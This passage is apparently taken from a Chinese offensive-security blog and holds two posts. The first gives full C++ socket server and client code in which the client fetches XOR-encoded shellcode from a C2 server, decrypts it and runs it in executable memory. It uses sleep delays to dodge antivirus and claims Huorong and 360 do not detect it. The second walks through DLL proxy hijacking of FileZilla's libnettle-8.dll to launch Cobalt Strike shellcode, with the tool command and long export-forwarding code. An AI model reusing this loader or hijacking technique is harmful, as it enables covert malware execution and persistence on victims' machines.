a4\\xa7\\x97\\x85\\xa3\\xc1\\xef&quot;; int retVal; //返回值 if (argc &lt;= 1) { cout &lt;&lt; &quot;USAGE: server.exe &lt;Listen Port&gt;&quot; &lt;&lt; endl; return -1; } if (WSAStartup(MAKEWORD(2, 2), &amp;wsd) != 0)//初始化套结字动态库 { cout &lt;&lt; &quot;WSAStartup failed!&quot; &lt;&lt; endl; return 1; } //创建套接字 sServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); if (INVALID_SOCKET == sServer) { cout &lt;&lt; &quot;Socket Failed!&quot; &lt;&lt; endl; WSACleanup();//释放套接字资源; return -1; } //服务器套接字地址 addrServ.sin_family = AF_INET; addrServ.sin_port = htons((short)atoi(argv[1]));; addrServ.sin_addr.s_addr = htonl(INADDR_ANY); //绑定套接字 retVal = bind(sServer, (LPSOCKADDR)&amp;addrServ, sizeof(SOCKADDR_IN)); if (SOCKET_ERROR == retVal) { cout &lt;&lt; &quot;Bind Failed!&quot; &lt;&lt; endl; closesocket(sServer); //关闭套接字 WSACleanup(); //释放套接字资源; return -1; } //开始监听 retVal = listen(sServer, 1); if (SOCKET_ERROR == retVal) { cout &lt;&lt; &quot;Listen Failed!&quot; &lt;&lt; endl; closesocket(sServer); //关闭套接字 WSACleanup(); //释放套接字资源; return -1; } cout &lt;&lt; &quot;开始监听中....&quot; &lt;&lt; endl; //接受客户端请求 sockaddr_in addrClient; int addrClientlen = sizeof(addrClient); sClient = accept(sServer, (sockaddr FAR*) &amp; addrClient, &amp;addrClientlen); // 生成对应当前客户端连接的套接字sClient if (INVALID_SOCKET == sClient) { cout &lt;&lt; &quot;Accept Failed!&quot; &lt;&lt; endl; closesocket(sServer); //关闭套接字 WSACleanup(); //释放套接字资源; return -1; } int flag = 1; //只接收一次 while (flag) { //接收客户端数据 ZeroMemory(buf, BUF_SIZE); // 填充为0 防止内存分配发生意外 retVal = recv(sClient, buf, BUF_SIZE, 0); // 接收数据放在buf缓冲区 if (SOCKET_ERROR == retVal) //判断是否接收错误 { cout &lt;&lt; &quot;Recv Failed!&quot; &lt;&lt; endl; closesocket(sServer); //关闭套接字 closesocket(sClient); //关闭套接字 WSACleanup(); //释放套接字资源; return -1; } if (buf[0] == '0') break; cout &lt;&lt; &quot;成功建立通信&quot; &lt;&lt; endl; send(sClient, sendBuf, sizeof(sendBuf), 0); cout &lt;&lt; &quot;向客户端发送shellcode...&quot; &lt;&lt; endl; cout &lt;&lt; &quot;发送shellcode成功!&quot; &lt;&lt; endl; flag = 0; } //退出 closesocket(sServer); //关闭套接字 closesocket(sClient); //关闭套接字 WSACleanup(); //释放套接字资源; return 0;} 客户端123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#include &lt;stdio.h&gt;#include &lt;iostream&gt;#include &lt;WinSock2.h&gt;#pragma comment(lib, &quot;ws2_32.lib&quot;) //添加ws2_32动态库#pragma warning(disable:4996) //忽略旧函数使用的警告using namespace std;int main(int argc, char* argv[]){ const int BUF_SIZE = 1024; WSADATA wsd; //WSADATA变量 SOCKET sHost; // 服务器套接字socket SOCKADDR_IN servAddr; //服务器地址 char buf[BUF_SIZE]; // 存放发送的数据缓冲区 char bufRecv[BUF_SIZE]; //接收收到的数据缓冲区 DWORD dwThreadId; HANDLE hThread; DWORD dwOldProtect; int retVal; // 返回值 if (argc &lt;= 2) { cout &lt;&lt; &quot;USAGE: client.exe &lt;Server IP&gt; &lt;Server PORT&gt;&quot; &lt;&lt; endl; return -1; } if (WSAStartup(MAKEWORD(2, 2), &amp;wsd) != 0) //初始化套结字动态库 { cout &lt;&lt; &quot;WSAStartup failed!&quot; &lt;&lt; endl; return -1; } sHost = socket(AF_INET, SOCK_STREAM, 0); //创建套接字 IPV4 可靠的，双向的类型服务提供商选择 if (INVALID_SOCKET == sHost) { cout &lt;&lt; &quot;socket failed!&quot; &lt;&lt; endl; WSACleanup(); return -1; } //设置服务器的地址 servAddr.sin_family = AF_INET; //指定IPV4 servAddr.sin_addr.s_addr = inet_addr(argv[1]); // 指定服务器的地址 servAddr.sin_port = htons((short)atoi(argv[2])); // 指定服务器的端口 retVal = connect(sHost, (LPSOCKADDR)&amp;servAddr, sizeof(servAddr)); // 套接字 sockaddr的指针，也就是地址 第三个参数为SOCKADDR_IN结构体的大小 if (SOCKET_ERROR == retVal) //判断是否连接成功 { cout &lt;&lt; &quot;connect failed!&quot; &lt;&lt; endl; closesocket(sHost); WSACleanup(); return -1; } ZeroMemory(buf, BUF_SIZE); // buf指向的地址用0来填充 strcpy(buf, &quot;ok&quot;); //给ok两个字节的字符串复制给buf区段 retVal = send(sHost, buf, strlen(buf), 0); //send的返回值 if (SOCKET_ERROR == retVal) //判断是否发送成功 { cout &lt;&lt; &quot;send failed!&quot; &lt;&lt; endl; closesocket(sHost); WSACleanup(); return -1; } cout &lt;&lt; &quot;Starting Download Payload&quot; &lt;&lt; endl; ZeroMemory(bufRecv, BUF_SIZE); // bufRevc指向的地址用0来填充 Sleep(2000); //延迟两秒起到免杀绕过的效果 recv(sHost, bufRecv, BUF_SIZE, 0); //bufRecv缓冲区接收 服务端发送来的数据 Sleep(4000); closesocket(sHost); WSACleanup(); for (int i = 0; i &lt; sizeof(bufRecv); i++) { //采取倾旋的方式来进行异或解密 //Sleep(50); _InterlockedXor8(bufRecv + i, 0x97); } cout &lt;&lt; &quot;加载shellcode中&quot; &lt;&lt; endl; //下面就是开辟内存存储shellcode 创建线程进行执行 char* shellcode = (char*)VirtualAlloc( NULL, BUF_SIZE, MEM_COMMIT, PAGE_READWRITE // 只申请可读可写 ); CopyMemory(shellcode, bufRecv, BUF_SIZE); VirtualProtect(shellcode, BUF_SIZE, PAGE_EXECUTE, &amp;dwOldProtect); // VirtualProtect改变它的属性 -&gt; 可执行 hThread = CreateThread( NULL, // 安全描述符 NULL, // 栈的大小 (LPTHREAD_START_ROUTINE)shellcode, // 函数 NULL, // 参数 NULL, // 线程标志 &amp;dwThreadId // 线程ID ); WaitForSingleObject(hThread, INFINITE); return 0;} 在c2上运行服务端 在目标机器上执行客户端文件,联网情况下火绒和360不查杀 成功上线 参考：https://www.cnblogs.com/zpchcbd/p/12170851.html https://payloads.online/archivers/2019-11-10/5","link":"/2020/12/13/%E5%88%A9%E7%94%A8SOCKET%E5%88%86%E7%A6%BBshellcode/"},{"title":"DLL代理加载shellcode实践","text":"在程序开发过程中往往会使用第三方库，大多数第三方库会提供DLL(动态链接库)文件，因此程序需要相应的DLL文件才能启动，通过Dll代理将正常dll替换为欸一dll，可以进行免杀或权限维持 找出运行必须的dll文件依照DLL代理加载shellcod用于免杀，维权等等中的例子下载Filezilla，将fzsftp.exe放到单独文件夹运行，找到运行必须的libnettle-8.dll文件 编译SharpDllProxy下载SharpDllProxy后用Visual Stuio 2019打开SharpDllProxy.sln 编译生成SharpDllProxy.exe 生成代理Dll指定目标dll文件后生成libnettle-8_pragma.c和tmp2BF5.dll，payload.bin为cs生成的raw格式shellcode。 1sharpdllproxy.exe --dll E:\\dllproxy\\libnettle-8.dll --payload E:\\dllproxy\\payload.bin 在vs中新建动态链接库将生成的libnettle-8_pragma.c代码复制后编译生成可执行shellcode的同名dll文件用以顶替原有的libnettle-8.dll文件 成功执行shellcode需要4个文件,fzsftp.exe调用替换后的恶意libnettle-8.dll文件后从payload.bin中读取shellcode后执行，tmp2BF5.dll即原来正常的libnettle-8.dll文件，保证程序正常运行 执行后cs成功上线 原理分析用vs打开libnettle-8_pragma.c后查看代码，开头调用了400多个tmp2BF5.dll中的函数以保证文件的正常运行 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546#include &quot;pch.h&quot;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define _CRT_SECURE_NO_DEPRECATE#pragma warning (disable : 4996)#pragma comment(linker, &quot;/export:_nettle_aeads=tmp2BF5._nettle_aeads,@1&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_decrypt=tmp2BF5._nettle_aes_decrypt,@2&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_decrypt_aesni=tmp2BF5._nettle_aes_decrypt_aesni,@3&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_decrypt_x86_64=tmp2BF5._nettle_aes_decrypt_x86_64,@4&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_encrypt=tmp2BF5._nettle_aes_encrypt,@5&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_encrypt_aesni=tmp2BF5._nettle_aes_encrypt_aesni,@6&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_encrypt_table=tmp2BF5._nettle_aes_encrypt_table,@7&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_encrypt_x86_64=tmp2BF5._nettle_aes_encrypt_x86_64,@8&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_invert=tmp2BF5._nettle_aes_invert,@9&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_set_key=tmp2BF5._nettle_aes_set_key,@10&quot;)#pragma comment(linker, &quot;/export:_nettle_armors=tmp2BF5._nettle_armors,@11&quot;)#pragma comment(linker, &quot;/export:_nettle_camellia_absorb=tmp2BF5._nettle_camellia_absorb,@12&quot;)#pragma comment(linker, &quot;/export:_nettle_camellia_crypt=tmp2BF5._nettle_camellia_crypt,@13&quot;)#pragma comment(linker, &quot;/export:_nettle_camellia_invert_key=tmp2BF5._nettle_camellia_invert_key,@14&quot;)#pragma comment(linker, &quot;/export:_nettle_camellia_table=tmp2BF5._nettle_camellia_table,@15&quot;)#pragma comment(linker, &quot;/export:_nettle_chacha_core=tmp2BF5._nettle_chacha_core,@16&quot;)#pragma comment(linker, &quot;/export:_nettle_ciphers=tmp2BF5._nettle_ciphers,@17&quot;)#pragma comment(linker, &quot;/export:_nettle_cpuid=tmp2BF5._nettle_cpuid,@18&quot;)#pragma comment(linker, &quot;/export:_nettle_ctr_crypt16=tmp2BF5._nettle_ctr_crypt16,@19&quot;)#pragma comment(linker, &quot;/export:_nettle_gcm_hash8=tmp2BF5._nettle_gcm_hash8,@20&quot;)#pragma comment(linker, &quot;/export:_nettle_gost28147_encrypt_block=tmp2BF5._nettle_gost28147_encrypt_block,@21&quot;)#pragma comment(linker, &quot;/export:_nettle_gost28147_param_CryptoPro_3411=tmp2BF5._nettle_gost28147_param_CryptoPro_3411,@22&quot;)#pragma comment(linker, &quot;/export:_nettle_gost28147_param_test_3411=tmp2BF5._nettle_gost28147_param_test_3411,@23&quot;)#pragma comment(linker, &quot;/export:_nettle_hashes=tmp2BF5._nettle_hashes,@24&quot;)#pragma comment(linker, &quot;/export:_nettle_macs=tmp2BF5._nettle_macs,@25&quot;)#pragma comment(linker, &quot;/export:_nettle_memxor_sse2=tmp2BF5._nettle_memxor_sse2,@26&quot;)#pragma comment(linker, &quot;/export:_nettle_memxor_x86_64=tmp2BF5._nettle_memxor_x86_64,@27&quot;)#pragma comment(linker, &quot;/export:_nettle_poly1305_block=tmp2BF5._nettle_poly1305_block,@28&quot;)#pragma comment(linker, &quot;/export:_nettle_poly1305_digest=tmp2BF5._nettle_poly1305_digest,@29&quot;)#pragma comment(linker, &quot;/export:_nettle_poly1305_set_key=tmp2BF5._nettle_poly1305_set_key,@30&quot;)#pragma comment(linker, &quot;/export:_nettle_ripemd160_compress=tmp2BF5._nettle_ripemd160_compress,@31&quot;)#pragma comment(linker, &quot;/export:_nettle_salsa20_core=tmp2BF5._nettle_salsa20_core,@32&quot;)#pragma comment(linker, &quot;/export:_nettle_sha1_compress_sha_ni=tmp2BF5._nettle_sha1_compress_sha_ni,@33&quot;)#pragma comment(linker, &quot;/export:_nettle_sha1_compress_x86_64=tmp2BF5._nettle_sha1_compress_x86_64,@34&quot;)#pragma comment(linker, &quot;/export:_nettle_sha256_compress=tmp2BF5._nettle_sha256_compress,@35&quot;)#pragma comment(linker, &quot;/export:_nettle_sha256_compress_sha_ni=tmp2BF5._nettle_sha256_compress_sha_ni,@36&quot;)#pragma comment(linker, &quot;/export:_nettle_sha256_compress_x86_64=tmp2BF5._nettle_sha256_compress_x86_64,@37&quot;)#pragma comment(linker, &quot;/export:_nettle_sha3_pad=tmp2BF5._nettle_sha3_pad,@38&quot;)#pragma comment(linker, &quot;/export:_nettle_sha3_update=tmp2BF5._nettle_sha3_update,@39&quot;)#pragma comment(linker, &quot;/export:_nettle_sha512_compress=tmp2BF5._nettle_sha512_compress,@40&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_l2=tmp2BF5._nettle_umac_l2,@41&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_l2_final=tmp2BF5._nettle_umac_l2_final,@42&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_l2_init=tmp2BF5._nettle_umac_l2_init,@43&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_l3=tmp2BF5._nettle_umac_l3,@44&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_l3_init=tmp2BF5._nettle_umac_l3_init,@45&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_nh=tmp2BF5._nettle_umac_nh,@46&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_nh_n=tmp2BF5._nettle_umac_nh_n,@47&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_poly128=tmp2BF5._nettle_umac_poly128,@48&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_poly64=tmp2BF5._nettle_umac_poly64,@49&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_set_key=tmp2BF5._nettle_umac_set_key,@50&quot;)#pragma comment(linker, &quot;/export:_nettle_write_be32=tmp2BF5._nettle_write_be32,@51&quot;)#pragma comment(linker, &quot;/export:_nettle_write_le32=tmp2BF5._nettle_write_le32,@52&quot;)#pragma comment(linker, &quot;/export:_nettle_write_le64=tmp2BF5._nettle_write_le64,@53&quot;)#pragma comment(linker, &quot;/export:nettle_MD5Final=tmp2BF5.nettle_MD5Final,@54&quot;)#pragma comment(linker, &quot;/export:nettle_MD5Init=tmp2BF5.nettle_MD5Init,@55&quot;)#pragma comment(linker, &quot;/export:nettle_MD5Update=tmp2BF5.nettle_MD5Update,@56&quot;)#pragma comment(linker, &quot;/export:nettle_aes128=tmp2BF5.nettle_aes128,@57&quot;)#pragma comment(linker, &quot;/export:nettle_aes128_decrypt=tmp2BF5.nettle_aes128_decrypt,@58&quot;)#pragma comment(linker, &quot;/export:nettle_aes128_encrypt=tmp2BF5.nettle_aes128_encrypt,@59&quot;)#pragma comment(linker, &quot;/export:nettle_aes128_invert_key=tmp2BF5.nettle_aes128_invert_key,@60&quot;)#pragma comment(linker, &quot;/export:nettle_aes128_set_decrypt_key=tmp2BF5.nettle_aes128_set_decrypt_key,@61&quot;)#pragma comment(linker, &quot;/export:nettle_aes128_set_encrypt_key=tmp2BF5.nettle_aes128_set_encrypt_key,@62&quot;)#pragma comment(linker, &quot;/export:nettle_aes192=tmp2BF5.nettle_aes192,@63&quot;)#pragma comment(linker, &quot;/export:nettle_aes192_decrypt=tmp2BF5.nettle_aes192_decrypt,@64&quot;)#pragma comment(linker, &quot;/export:nettle_aes192_encrypt=tmp2BF5.nettle_aes192_encrypt,@65&quot;)#pragma comment(linker, &quot;/export:nettle_aes192_invert_key=tmp2BF5.nettle_aes192_invert_key,@66&quot;)#pragma comment(linker, &quot;/export:nettle_aes192_set_decrypt_key=tmp2BF5.nettle_aes192_set_decrypt_key,@67&quot;)#pragma comment(linker, &quot;/export:nettle_aes192_set_encrypt_key=tmp2BF5.nettle_aes192_set_encrypt_key,@68&quot;)#pragma comment(linker, &quot;/export:nettle_aes256=tmp2BF5.nettle_aes256,@69&quot;)#pragma comment(linker, &quot;/export:nettle_aes256_decrypt=tmp2BF5.nettle_aes256_decrypt,@70&quot;)#pragma comment(linker, &quot;/export:nettle_aes256_encrypt=tmp2BF5.nettle_aes256_encrypt,@71&quot;)#pragma comment(linker, &quot;/export:nettle_aes256_invert_key=tmp2BF5.nettle_aes256_invert_key,@72&quot;)#pragma comment(linker, &quot;/export:nettle_aes256_set_decrypt_key=tmp2BF5.nettle_aes256_set_decrypt_key,@73&quot;)#pragma comment(linker, &quot;/export:nettle_aes256_set_encrypt_key=tmp2BF5.nettle_aes256_set_encrypt_key,@74&quot;)#pragma comment(linker, &quot;/export:nettle_aes_decrypt=tmp2BF5.nettle_aes_decrypt,@75&quot;)#pragma comment(linker, &quot;/export:nettle_aes_encrypt=tmp2BF5.nettle_aes_encrypt,@76&quot;)#pragma comment(linker, &quot;/export:nettle_aes_invert_key=tmp2BF5.nettle_aes_invert_key,@77&quot;)#pragma comment(linker, &quot;/export:nettle_aes_set_decrypt_key=tmp2BF5.nettle_aes_set_decrypt_key,@78&quot;)#pragma comment(linker, &quot;/export:nettle_aes_set_encrypt_key=tmp2BF5.nettle_aes_set_encrypt_key,@79&quot;)#pragma comment(linker, &quot;/export:nettle_arcfour128_set_key=tmp2BF5.nettle_arcfour128_set_key,@80&quot;)#pragma comment(linker, &quot;/export:nettle_arcfour_crypt=tmp2BF5.nettle_arcfour_crypt,@81&quot;)#pragma comment(linker, &quot;/export:nettle_arcfour_set_key=tmp2BF5.nettle_arcfour_set_key,@82&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo128=tmp2BF5.nettle_arctwo128,@83&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo128_set_key=tmp2BF5.nettle_arctwo128_set_key,@84&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo128_set_key_gutmann=tmp2BF5.nettle_arctwo128_set_key_gutmann,@85&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo40=tmp2BF5.nettle_arctwo40,@86&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo40_set_key=tmp2BF5.nettle_arctwo40_set_key,@87&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo64=tmp2BF5.nettle_arctwo64,@88&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo64_set_key=tmp2BF5.nettle_arctwo64_set_key,@89&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo_decrypt=tmp2BF5.nettle_arctwo_decrypt,@90&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo_encrypt=tmp2BF5.nettle_arctwo_encrypt,@91&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo_gutmann128=tmp2BF5.nettle_arctwo_gutmann128,@92&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo_set_key=tmp2BF5.nettle_arctwo_set_key,@93&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo_set_key_ekb=tmp2BF5.nettle_arctwo_set_key_ekb,@94&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo_set_key_gutmann=tmp2BF5.nettle_arctwo_set_key_gutmann,@95&quot;)#pragma comment(linker, &quot;/export:nettle_base16=tmp2BF5.nettle_base16,@96&quot;)#pragma comment(linker, &quot;/export:nettle_base16_decode_final=tmp2BF5.nettle_base16_decode_final,@97&quot;)#pragma comment(linker, &quot;/export:nettle_base16_decode_init=tmp2BF5.nettle_base16_decode_init,@98&quot;)#pragma comment(linker, &quot;/export:nettle_base16_decode_single=tmp2BF5.nettle_base16_decode_single,@99&quot;)#pragma comment(linker, &quot;/export:nettle_base16_decode_update=tmp2BF5.nettle_base16_decode_update,@100&quot;)#pragma comment(linker, &quot;/export:nettle_base16_encode_single=tmp2BF5.nettle_base16_encode_single,@101&quot;)#pragma comment(linker, &quot;/export:nettle_base16_encode_update=tmp2BF5.nettle_base16_encode_update,@102&quot;)#pragma comment(linker, &quot;/export:nettle_base64=tmp2BF5.nettle_base64,@103&quot;)#pragma comment(linker, &quot;/export:nettle_base64_decode_final=tmp2BF5.nettle_base64_decode_final,@104&quot;)#pragma comment(linker, &quot;/export:nettle_base64_decode_init=tmp2BF5.nettle_base64_decode_init,@105&quot;)#pragma comment(linker, &quot;/export:nettle_base64_decode_single=tmp2BF5.nettle_base64_decode_single,@106&quot;)#pragma comment(linker, &quot;/export:nettle_base64_decode_update=tmp2BF5.nettle_base64_decode_update,@107&quot;)#pragma comment(linker, &quot;/export:nettle_base64_encode_final=tmp2BF5.nettle_base64_encode_final,@108&quot;)#pragma comment(linker, &quot;/export:nettle_base64_encode_group=tmp2BF5.nettle_base64_encode_group,@109&quot;)#pragma comment(linker, &quot;/export:nettle_base64_encode_init=tmp2BF5.nettle_base64_encode_init,@110&quot;)#pragma comment(linker, &quot;/export:nettle_base64_encode_raw=tmp2BF5.nettle_base64_encode_raw,@111&quot;)#pragma comment(linker, &quot;/export:nettle_base64_encode_single=tmp2BF5.nettle_base64_encode_single,@112&quot;)#pragma comment(linker, &quot;/export:nettle_base64_encode_update=tmp2BF5.nettle_base64_encode_update,@113&quot;)#pragma comment(linker, &quot;/export:nettle_base64url=tmp2BF5.nettle_base64url,@114&quot;)#pragma comment(linker, &quot;/export:nettle_base64url_decode_init=tmp2BF5.nettle_base64url_decode_init,@115&quot;)#pragma comment(linker, &quot;/export:nettle_base64url_encode_init=tmp2BF5.nettle_base64url_encode_init,@116&quot;)#pragma comment(linker, &quot;/export:nettle_blowfish128_set_key=tmp2BF5.nettle_blowfish128_set_key,@117&quot;)#pragma comment(linker, &quot;/export:nettle_blowfish_decrypt=tmp2BF5.nettle_blowfish_decrypt,@118&quot;)#pragma comment(linker, &quot;/export:nettle_blowfish_encrypt=tmp2BF5.nettle_blowfish_encrypt,@119&quot;)#pragma comment(linker, &quot;/export:nettle_blowfish_set_key=tmp2BF5.nettle_blowfish_set_key,@120&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_clear=tmp2BF5.nettle_buffer_clear,@121&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_copy=tmp2BF5.nettle_buffer_copy,@122&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_grow=tmp2BF5.nettle_buffer_grow,@123&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_init=tmp2BF5.nettle_buffer_init,@124&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_init_realloc=tmp2BF5.nettle_buffer_init_realloc,@125&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_init_size=tmp2BF5.nettle_buffer_init_size,@126&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_reset=tmp2BF5.nettle_buffer_reset,@127&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_space=tmp2BF5.nettle_buffer_space,@128&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_write=tmp2BF5.nettle_buffer_write,@129&quot;)#pragma comment(linker, &quot;/export:nettle_camellia128=tmp2BF5.nettle_camellia128,@130&quot;)#pragma comment(linker, &quot;/export:nettle_camellia128_crypt=tmp2BF5.nettle_camellia128_crypt,@131&quot;)#pragma comment(linker, &quot;/export:nettle_camellia128_invert_key=tmp2BF5.nettle_camellia128_invert_key,@132&quot;)#pragma comment(linker, &quot;/export:nettle_camellia128_set_encrypt_key=tmp2BF5.nettle_camellia128_set_encrypt_key,@133&quot;)#pragma comment(linker, &quot;/export:nettle_camellia192=tmp2BF5.nettle_camellia192,@134&quot;)#pragma comment(linker, &quot;/export:nettle_camellia192_set_decrypt_key=tmp2BF5.nettle_camellia192_set_decrypt_key,@135&quot;)#pragma comment(linker, &quot;/export:nettle_camellia192_set_encrypt_key=tmp2BF5.nettle_camellia192_set_encrypt_key,@136&quot;)#pragma comment(linker, &quot;/export:nettle_camellia256=tmp2BF5.nettle_camellia256,@137&quot;)#pragma comment(linker, &quot;/export:nettle_camellia256_crypt=tmp2BF5.nettle_camellia256_crypt,@138&quot;)#pragma comment(linker, &quot;/export:nettle_camellia256_invert_key=tmp2BF5.nettle_camellia256_invert_key,@139&quot;)#pragma comment(linker, &quot;/export:nettle_camellia256_set_decrypt_key=tmp2BF5.nettle_camellia256_set_decrypt_key,@140&quot;)#pragma comment(linker, &quot;/export:nettle_camellia256_set_encrypt_key=tmp2BF5.nettle_camellia256_set_encrypt_key,@141&quot;)#pragma comment(linker, &quot;/export:nettle_camellia_set_decrypt_key=tmp2BF5.nettle_camellia_set_decrypt_key,@142&quot;)#pragma comment(linker, &quot;/export:nettle_cast128=tmp2BF5.nettle_cast128,@143&quot;)#pragma comment(linker, &quot;/export:nettle_cast128_decrypt=tmp2BF5.nettle_cast128_decrypt,@144&quot;)#pragma comment(linker, &quot;/export:nettle_cast128_encrypt=tmp2BF5.nettle_cast128_encrypt,@145&quot;)#pragma comment(linker, &quot;/export:nettle_cast128_set_key=tmp2BF5.nettle_cast128_set_key,@146&quot;)#pragma comment(linker, &quot;/export:nettle_cast5_set_key=tmp2BF5.nettle_cast5_set_key,@147&quot;)#pragma comment(linker, &quot;/export:nettle_cbc_decrypt=tmp2BF5.nettle_cbc_decrypt,@148&quot;)#pragma comment(linker, &quot;/export:nettle_cbc_encrypt=tmp2BF5.nettle_cbc_encrypt,@149&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_decrypt=tmp2BF5.nettle_ccm_aes128_decrypt,@150&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_decrypt_message=tmp2BF5.nettle_ccm_aes128_decrypt_message,@151&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_digest=tmp2BF5.nettle_ccm_aes128_digest,@152&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_encrypt=tmp2BF5.nettle_ccm_aes128_encrypt,@153&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_encrypt_message=tmp2BF5.nettle_ccm_aes128_encrypt_message,@154&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_set_key=tmp2BF5.nettle_ccm_aes128_set_key,@155&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_set_nonce=tmp2BF5.nettle_ccm_aes128_set_nonce,@156&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_update=tmp2BF5.nettle_ccm_aes128_update,@157&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_decrypt=tmp2BF5.nettle_ccm_aes192_decrypt,@158&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_decrypt_message=tmp2BF5.nettle_ccm_aes192_decrypt_message,@159&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_digest=tmp2BF5.nettle_ccm_aes192_digest,@160&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_encrypt=tmp2BF5.nettle_ccm_aes192_encrypt,@161&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_encrypt_message=tmp2BF5.nettle_ccm_aes192_encrypt_message,@162&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_set_key=tmp2BF5.nettle_ccm_aes192_set_key,@163&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_set_nonce=tmp2BF5.nettle_ccm_aes192_set_nonce,@164&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_update=tmp2BF5.nettle_ccm_aes192_update,@165&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_decrypt=tmp2BF5.nettle_ccm_aes256_decrypt,@166&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_decrypt_message=tmp2BF5.nettle_ccm_aes256_decrypt_message,@167&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_digest=tmp2BF5.nettle_ccm_aes256_digest,@168&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_encrypt=tmp2BF5.nettle_ccm_aes256_encrypt,@169&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_encrypt_message=tmp2BF5.nettle_ccm_aes256_encrypt_message,@170&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_set_key=tmp2BF5.nettle_ccm_aes256_set_key,@171&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_set_nonce=tmp2BF5.nettle_ccm_aes256_set_nonce,@172&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_update=tmp2BF5.nettle_ccm_aes256_update,@173&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_decrypt=tmp2BF5.nettle_ccm_decrypt,@174&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_decrypt_message=tmp2BF5.nettle_ccm_decrypt_message,@175&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_digest=tmp2BF5.nettle_ccm_digest,@176&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_encrypt=tmp2BF5.nettle_ccm_encrypt,@177&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_encrypt_message=tmp2BF5.nettle_ccm_encrypt_message,@178&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_set_nonce=tmp2BF5.nettle_ccm_set_nonce,@179&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_update=tmp2BF5.nettle_ccm_update,@180&quot;)#pragma 